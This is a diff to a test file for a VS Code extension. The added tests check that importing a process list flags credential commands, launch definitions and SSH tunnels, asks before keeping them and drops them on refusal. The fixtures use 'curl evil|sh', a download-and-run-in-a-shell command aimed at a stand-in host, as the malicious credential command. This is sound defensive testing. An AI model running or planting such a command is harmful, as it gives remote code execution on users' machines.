@@ -6,7 +6,7 @@ const test = require("node:test");
 const assert = require("node:assert");
 const pkg = require("../package.json");
 const { parseProcesses, processTooltip, readProcessFile } = require("../out/processes.js");
-const { CONNECT_SCRIPT_COMMANDS, scriptOf, scriptPath, scriptsBrought, scriptSummary, withScript } = require("../out/connectscript.js");
+const { CONNECT_SCRIPT_COMMANDS, onConnectBrought, onConnectOf, scriptOf, scriptPath, scriptsBrought, scriptSummary, withScript } = require("../out/connectscript.js");
 const { Live } = require("../out/live.js");
 
 const proc = (label, extra = {}) => ({ label, host: "h", port: 1, tags: [], ...extra });
@@ -50,6 +50,22 @@ test("an import brings scripts that are new or changed, not ones already kept", 
   const before = [proc("a", { init: "x:1" }), proc("b")];
   assert.deepStrictEqual(scriptsBrought(before, [proc("a", { init: "x:1" }), proc("b", { init: "y" }), proc("c", { initFile: "f.q" }), proc("d")]), ["b", "c"]);
   assert.deepStrictEqual(scriptsBrought(before, [proc("a", { init: "x:2" })]), ["a"]);
+});
+
+// Import asked about connect scripts only: a file's credential command (a
+// shell command run on every connect), launch definition and SSH tunnel
+// were taken silently, so importing a list and clicking Connect ran it.
+test("an import brings credential commands, launch definitions and tunnels as it does scripts (#1108)", () => {
+  const before = [proc("a", { ssh: "bastion" }), proc("b", { credentialCommand: "pass q" })];
+  const incoming = [proc("a", { ssh: "bastion" }), proc("b", { credentialCommand: "curl evil|sh" }), proc("c", { launch: { command: "q" }, init: "x:1" }), proc("d")];
+  assert.deepStrictEqual(onConnectBrought(before, incoming), [
+    { label: "b", what: ["credential command"] },
+    { label: "c", what: ["connect script", "launch definition"] },
+  ]);
+  // Taken without them: what was there before, or none.
+  assert.deepStrictEqual(onConnectOf(incoming[1], before[1]), proc("b", { credentialCommand: "pass q" }));
+  assert.deepStrictEqual(onConnectOf(incoming[2], undefined), proc("c"));
+  assert.deepStrictEqual(onConnectOf(proc("a", { ssh: "evil", tags: ["t"] }), before[0]), proc("a", { ssh: "bastion", tags: ["t"] }));
 });
 
 test("a script is summed up in a line", () => {
@@ -132,6 +148,24 @@ test("Edit Process keeps the connect script; Import asks before taking one", asy
   stub.picks.push("Import with Scripts");
   await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
   assert.deepStrictEqual(live.processes().map((p) => scriptOf(p)), [{ kind: "code", code: "evil:1" }, { kind: "file", file: "i.q" }]);
+});
+
+test("Import asks before taking a credential command, and drops it on without (#1108)", async (t) => {
+  const { live } = await setUp(t, [proc("a")]);
+  const vscode = require("vscode");
+  const fs = vscode.workspace.fs;
+  const list = JSON.stringify({ processes: [{ label: "a", host: "h", port: 1, credentialCommand: "curl evil|sh" }, { label: "n", host: "h", port: 2, ssh: "jump", launch: { command: "q" } }] });
+  vscode.workspace.fs = { readFile: async () => Buffer.from(list) };
+  t.after(() => (vscode.workspace.fs = fs));
+  let asked;
+  stub.picks.push(({ message, items }) => ((asked = [message, items.slice(1)]), "Import without Them"));
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.match(asked[0], /gives 2 process\(es\) what runs at every connect.*: a \(credential command\), n \(launch definition, SSH tunnel\)\. Keep them\?/);
+  assert.deepStrictEqual(asked[1], ["Import with Them", "Import without Them"]);
+  assert.deepStrictEqual(live.processes(), [proc("a"), proc("n", { port: 2 })]);
+  stub.picks.push("Import with Them");
+  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
+  assert.deepStrictEqual(live.processes().map((p) => [p.credentialCommand, p.ssh, p.launch]), [["curl evil|sh", undefined, undefined], [undefined, "jump", { command: "q" }]]);
 });
 
 test("with q-lint.connection.connectScript.enable off, Set Connect Script refuses and no script is sent", async (t) => {
